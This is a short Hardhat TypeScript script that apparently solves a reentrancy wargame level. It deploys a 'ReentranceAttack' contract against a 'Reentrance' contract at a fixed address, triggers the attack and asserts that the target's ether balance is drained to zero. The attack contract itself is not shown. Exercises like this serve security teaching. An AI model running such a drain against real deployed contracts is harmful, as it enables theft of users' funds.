import { assert, expect } from "chai";
import { ethers, waffle } from "hardhat";
import { ReentranceAttack__factory } from "../typechain/factories/ReentranceAttack__factory";
import { Reentrance__factory } from "../typechain/factories/Reentrance__factory";
import { Reentrance } from "../typechain/Reentrance";
import { ReentranceAttack } from "../typechain/ReentranceAttack";

async function main() {
  const [addr1] = await ethers.getSigners();
  const provider = waffle.provider;
  const deployedAddress = '0x887FdEf92530d3F6cE4711F1775AE4a38544A2e4';
  const reentranceInstance: Reentrance = Reentrance__factory.connect(deployedAddress, addr1);

  const attackInstance: ReentranceAttack = await new ReentranceAttack__factory(addr1).deploy(deployedAddress, { value: ethers.utils.parseEther("1") });
  await attackInstance.deployed();
  console.log("deployed : " + attackInstance.address)
  
  expect((await provider.getBalance(deployedAddress)).toString()).to.equal(ethers.utils.parseEther("1").toString());
  
  await attackInstance.attack(reentranceInstance.address, { gasLimit: 200000 });
  expect((await provider.getBalance(deployedAddress)).toString()).to.equal(ethers.utils.parseEther("0").toString());
  console.log((await provider.getBalance(deployedAddress)).toString())
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
